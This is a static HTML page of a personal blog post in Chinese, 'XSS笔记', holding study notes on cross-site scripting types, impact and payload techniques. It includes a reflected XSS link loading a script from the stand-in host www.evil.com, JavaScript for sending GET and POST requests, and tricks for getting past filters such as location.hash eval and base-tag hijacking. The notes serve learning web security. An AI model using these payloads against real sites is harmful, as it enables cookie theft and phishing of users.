@@ -1,0 +1,309 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XSS笔记 | Reticence</title>
+<link rel="shortcut icon" href="http://127.0.0.1:8080/favicon.ico?v=1619508275369">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="http://127.0.0.1:8080/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XSS笔记 | Reticence - Atom Feed" href="http://127.0.0.1:8080/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-90HNEFFE0M"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-90HNEFFE0M');
+</script>
+
+
+    <meta name="description" content="
+XSS挑战http://xss.fbisb.com/yx/index.php
+要学好JavaScript才能构造好payload。
+XSS的本质还是一种HTML注入，用户的数据被当成HTML代码的一部分来执行。
+分类
+反射性XSS：一般是..." />
+    <meta name="keywords" content="Web" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="http://127.0.0.1:8080">
+  <img class="avatar" src="http://127.0.0.1:8080/images/avatar.png?v=1619508275369" alt="">
+  </a>
+  <h1 class="site-title">
+    Reticence
+  </h1>
+  <p class="site-description">
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Index
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          Classification
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/navigator.html" class="menu">
+          Navigator
+        </a>
+      
+    
+      
+        <a href="/post/book-list" class="menu">
+          Booklist
+        </a>
+      
+    
+      
+        <a href="/post/fei-md-ge-shi-bi-ji-hui-zong" class="menu">
+          Notes
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          About
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/reticenceji" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+        <a href="https://www.zhihu.com/people/reticenceji" target="_blank">
+          <i class="ri-zhihu-line"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?197e96d6e079d4c80f9674c92eb62002";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  </script>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XSS笔记
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-08-02
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="http://127.0.0.1:8080/tag/FsPAOTRN-/" class="post-tag">
+                  # Web
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <!--参考《白帽子讲Web安全》-->
+<p><a href="http://xss.fbisb.com/yx/index.php">XSS挑战</a>http://xss.fbisb.com/yx/index.php<br>
+要学好JavaScript才能构造好payload。<br>
+XSS的本质还是一种HTML注入，用户的数据被当成HTML代码的一部分来执行。</p>
+<h3 id="分类">分类</h3>
+<p>反射性XSS：一般是诱使用户点击链接<br>
+存储型XSS：把恶意脚本保存在服务器<br>
+DOM型XSS：修改页面的DOM节点（这是一个例子：http://10.214.160.13:10000/the2nd.php），从JavaScript中输出数据到HTML页面里。</p>
+<h3 id="危害">危害</h3>
+<p>网上的教程都是让你alert(&quot;/xxs/&quot;)，这只能反映出漏洞的存在。<br>
+实际用于完成恶意功能的脚本，叫“XSS PAYLOAD”。脚本的类型有很多，比如javascript,vbscript等。<br>
+<strong>窃取COOKIE</strong><br>
+<strong>一个网站的应用，只要接受HTTP协议中的GET和POST请求，就可以完成所有操作。而JavaScript就可以让浏览器发起这两个请求</strong>，由此可以“操控”浏览器。<br>
+比如反射性，我需要构造这样的链接：<br>
+<code>(http://xss.fbisb.com/yx/level1.php?name=&lt;script src = http://www.evil.com/evil.js&gt;&lt;/script&gt;)</code><br>
+利用图片发送GET请求</p>
+<pre><code>var img = document.createElement(&quot;img&quot;);
+img.src = &quot;http://xxxxxxxxx?key=value&quot;;
+document.body.appendChild(img);
+</code></pre>
+<p>这是一个js脚本，一个Payload，针对POST方法</p>
+<pre><code>//构造表单
+var f = document.createElement(&quot;form&quot;);
+f.action = &quot;&quot;;
+f.method = &quot;post&quot;;
+document.body.appendChild(f);
+//添加参数
+var i1 = document.createElement(&quot;input&quot;);
+i1.name = &quot;ck&quot;;
+i1.value = &quot;Jiuu&quot;;
+f.appendChild(i1);
+//提交
+f.submit();
+</code></pre>
+<p><strong>可以用代码伪造登录框，实现钓鱼。</strong><br>
+<strong>获得用户使用的浏览器信息，安装的软件信息，安装的插件信息，IP地址</strong><br>
+Attack API 项目总结了很多能直接使用的XSS Payload<br>
+BeEF XSS演示平台</p>
+<h3 id="xss构造技巧">XSS构造技巧</h3>
+<ul>
+<li>利用字符编码绕过过滤</li>
+<li>绕过长度限制：<br>
+可以利用<em>Location hash</em>属性，就是URL中#号后面的部分。onclick=&quot;eval(location.hash.substr(1))&quot;，远程加载js，</li>
+<li><code>&lt;base&gt;</code>标签是使用来为页面中的所有<strong>相对链接</strong>指定默认地址（目录）或默认属性（target属性）<code>&lt;base&gt;</code>标签可以出现在页面的任何地方。十分危险，可以劫持当前页面使用相对路径的资源。</li>
+<li>利用window.name实现跨域：<br>
+在www.a.com/index.html实现</li>
+</ul>
+<pre><code>&lt;script&gt;
+    window.name = &quot;我在A里哦&quot;;
+    window.location = &quot;http://www.b.com/index.html&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>在http://www.b.com/index.html，你会发现，数据跨域传输了</p>
+<pre><code>&lt;script&gt;
+    alert(window.name);
+&lt;/script&gt;
+</code></pre>
+<h3 id="解决方法">解决方法</h3>
+<p>这个看的不是很明白，有点累了。<br>
+核心思想是，对用户输入进行编码。但要注意编码解码逻辑。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E5%88%86%E7%B1%BB">分类</a></li>
+<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
+<li><a href="#xss%E6%9E%84%E9%80%A0%E6%8A%80%E5%B7%A7">XSS构造技巧</a></li>
+<li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">解决方法</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="http://127.0.0.1:8080/post/another-rsa-writeup/">
+              <h3 class="post-title">
+                Another RSA Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="http://127.0.0.1:8080/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
